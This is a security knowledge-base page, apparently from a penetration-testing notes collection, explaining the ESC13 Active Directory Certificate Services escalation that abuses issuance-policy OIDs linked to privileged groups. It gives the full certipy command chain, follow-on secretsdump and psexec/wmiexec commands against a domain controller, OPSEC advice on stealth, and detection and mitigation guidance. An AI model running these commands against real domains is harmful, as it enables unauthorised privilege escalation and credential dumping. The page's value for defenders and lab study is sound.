---
title: "ESC13 — Issuance Policy OID Group Link"
description: "ESC13 is fundamentally different from every other ESC attack. Where ESC1–ESC12 focus on impersonating a specific user, ESC13 achieves privilege escalation…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs", "privilege-escalation"]
tools: ["Impacket", "Certipy", "BloodHound", "ldapsearch", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC13 — Issuance Policy OID Group Link.md"
---
# ESC13 — Issuance Policy OID Group Link

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Issuance Policy / Group Membership Escalation |
| **Difficulty** | Medium |
| **Pre-requisites** | Enrollment rights on a template with linked issuance policy OID |
| **Tools** | Certipy, BloodHound, PowerView |
| **OPSEC Noise** | Low — uses legitimate enrollment, no attribute manipulation |
| **One-liner** | Enroll in a template whose issuance policy OID is linked to a privileged AD group via `ms-DS-OIDToGroup-Link`, granting effective group membership upon certificate authentication. |

***

## What Is ESC13?

ESC13 is fundamentally different from every other ESC attack. Where ESC1–ESC12 focus on **impersonating a specific user**, ESC13 achieves privilege escalation by **gaining effective membership in a privileged group** — without any AD account attribute modification, without UPN swapping, and without SAN injection.

The mechanism exploits Microsoft's **Authentication Mechanism Assurance (AMA)** feature. AMA allows organisations to map an Issuance Policy OID in a certificate to an AD security group via the `ms-DS-OIDToGroup-Link` attribute. When a user authenticates with a certificate that has this policy, the KDC adds the linked group's SID to the user's Privilege Attribute Certificate (PAC) — effectively granting them membership in that group for the duration of the session.

The abuse: if a low-privileged user can **enroll** in a template that includes an issuance policy linked to a privileged group (like Domain Admins or a custom admin group), they receive that group's privileges upon certificate-based authentication.

***

## The Mechanism

```
Normal AMA flow (intended):
  Template has Issuance Policy → OID "1.2.3.4.5.6"
  OID "1.2.3.4.5.6" linked via ms-DS-OIDToGroup-Link → "PKI-Admins" group
  User enrolls → Cert has Issuance Policy "1.2.3.4.5.6"
  User authenticates → KDC adds "PKI-Admins" SID to PAC
  Result: User has PKI-Admins privileges for this session

ESC13 abuse:
  Same flow — but enrollment rights are overly permissive
  Low-priv user enrolls in the template
  Gets effective group membership in a privileged group
  = Privilege escalation without modifying any AD object
```

***

## Required Conditions

| Condition | Notes |
|-----------|-------|
| Template has an **Issuance Policy** configured | Check template's `msPKI-Certificate-Policy` attribute |
| The Issuance Policy OID has **`ms-DS-OIDToGroup-Link`** set | Links to a security group |
| The linked group is **privileged** | Domain Admins, custom admin groups, etc. |
| Low-priv users can **enroll** | `Enrollment Rights: Domain Users` |
| Manager Approval is off | `Requires Manager Approval: False` |
| No authorized signatures required | `Authorized Signatures Required: 0` |
| Template has **Client Authentication EKU** | For domain authentication |

***

## Step 0 — Enumeration

```bash
# Standard certipy scan
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# Look for ESC13 in output — certipy flags it when it detects OID group links
```

### What Vulnerable ESC13 Output Looks Like

```
Certificate Templates
  Template Name                       : LinkedPolicyTemplate
  Enabled                             : True
  Client Authentication               : True
  Enrollee Supplies Subject           : False
  Requires Manager Approval           : False
  Authorized Signatures Required      : 0
  Certificate Policies                : 1.2.3.4.5.6.7.8   ← Issuance Policy OID
  Permissions
    Enrollment Rights : DOMAIN\Domain Users

  [!] Vulnerabilities
    ESC13 : Certificate template has an issuance policy OID linked
            to a group via ms-DS-OIDToGroup-Link
    OID Group Link : DOMAIN\PrivilegedGroup
```

### Manual Enumeration of OID Group Links

```powershell
# PowerShell — find all OID objects with group links
Get-ADObject -SearchBase "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=htb" \
  -Filter {msPKI-Cert-Template-OID -like '*'} \
  -Properties 'ms-DS-OIDToGroup-Link','msPKI-Cert-Template-OID','DisplayName' |
  Where-Object { $_.'ms-DS-OIDToGroup-Link' -ne $null } |
  Select-Object DisplayName, 'msPKI-Cert-Template-OID', 'ms-DS-OIDToGroup-Link'

# Output shows which OIDs are linked to which groups
```

```bash
# From Linux via LDAP
ldapsearch -x -H ldap://$TARGET -D 'lowpriv@domain.htb' -w 'Password123!' \
  -b "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=htb" \
  '(msDS-OIDToGroupLink=*)' dn msDS-OIDToGroupLink msPKI-Cert-Template-OID
```

***

## Full Attack Chain — Linux (Certipy)

### Step 1 — Request Certificate from the Linked Template

```bash
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'LinkedPolicyTemplate'

# Output: lowpriv.pfx
# This cert contains the Issuance Policy OID that is linked to the privileged group
```

### Step 2 — Authenticate with the Certificate

```bash
certipy-ad auth \
  -pfx lowpriv.pfx \
  -username lowpriv \
  -domain domain.htb \
  -dc-ip $TARGET

# The KDC adds the linked group's SID to your PAC
# You now effectively have that group's privileges
```

### Step 3 — Use Elevated Privileges

```bash
export KRB5CCNAME=lowpriv.ccache

# If the linked group has DCSync rights:
secretsdump.py -k -no-pass DC01.domain.htb

# If the linked group has admin access:
wmiexec.py -k -no-pass DC01.domain.htb
psexec.py -k -no-pass DC01.domain.htb
```

> 💡 Your TGT has the privileged group's SID in the PAC. Any service that checks group membership via the PAC will grant you access. You don't need to pass-the-hash or impersonate another user — **you ARE still lowpriv, but with extra group memberships**.

***

## ESC13 Visual Attack Flow

```
[lowpriv@domain.htb]
        │
        │  certipy req -template LinkedPolicyTemplate
        ▼
[lowpriv.pfx] ← Contains Issuance Policy OID 1.2.3.4.5.6
        │
        │  certipy auth -pfx lowpriv.pfx
        ▼
[KDC processes cert → sees OID → looks up ms-DS-OIDToGroup-Link]
        │
        │  KDC adds PrivilegedGroup SID to PAC
        ▼
[TGT for lowpriv WITH PrivilegedGroup membership]
        │
        ▼
[PRIVILEGE ESCALATION — access controlled by group membership]
```

***

## ESC13 vs All Other ESCs

| | ESC1–12 / ESC15–17 | **ESC13** |
|---|---|---|
| **What you get** | Identity of another user | **Group membership for yourself** |
| **UPN change required** | Usually yes | ❌ No |
| **SAN injection required** | Often yes | ❌ No |
| **Account manipulation** | Often yes | ❌ No |
| **Your identity changes** | ✅ You become someone else | ❌ **You stay YOU — just with extra groups** |
| **Mechanism** | Certificate identity spoofing | **PAC group SID injection via AMA** |
| **Stealth** | Varies | 🟢 **Very stealthy — legitimate enrollment** |

***

## OPSEC Considerations

| Action | Log Generated | Noise Level |
|--------|--------------|-------------|
| Certificate request | Event ID 4886/4887 | 🟢 Low (looks like normal enrollment) |
| Certificate auth | Event ID 4768 (TGT request) | 🟢 Low (normal PKINIT) |
| Privileged action with TGT | Depends on what you do | 🟡 Medium |

> 💡 ESC13 is one of the **stealthiest** ESC attacks because it uses completely legitimate enrollment functionality. No AD attributes are modified, no accounts are impersonated — you simply enroll in a template you're allowed to use. The only anomaly is a low-priv user suddenly having privileged access.

***

## Detection Indicators

- **Event ID 4887** — Certificate issued from a template that has an issuance policy linked to a privileged group — cross-reference requester's actual group memberships
- **PAC analysis** — TGTs containing group SIDs that don't match the user's actual AD group memberships
- **BloodHound** — Edges from low-priv principals to templates with linked OID groups
- **Audit `ms-DS-OIDToGroup-Link`** — Any OID object with this attribute pointing to a privileged group should be treated as a Tier 0 configuration

***

## Mitigation

- **Restrict enrollment rights** on templates with linked issuance policies — these should only be enrollable by the intended audience (e.g., Tier 0 admins)
- **Audit all `ms-DS-OIDToGroup-Link` attributes** — verify that every linked group is intentionally exposed to certificate-based membership
- **Avoid linking OIDs to highly privileged groups** — Domain Admins, Enterprise Admins, Schema Admins should never be linked to issuance policies
- **Monitor certificate enrollment** for templates with issuance policies — alert on enrollment by users not in the intended group
- **Remove unused issuance policies** — if the AMA feature isn't actively used, remove all OID group links
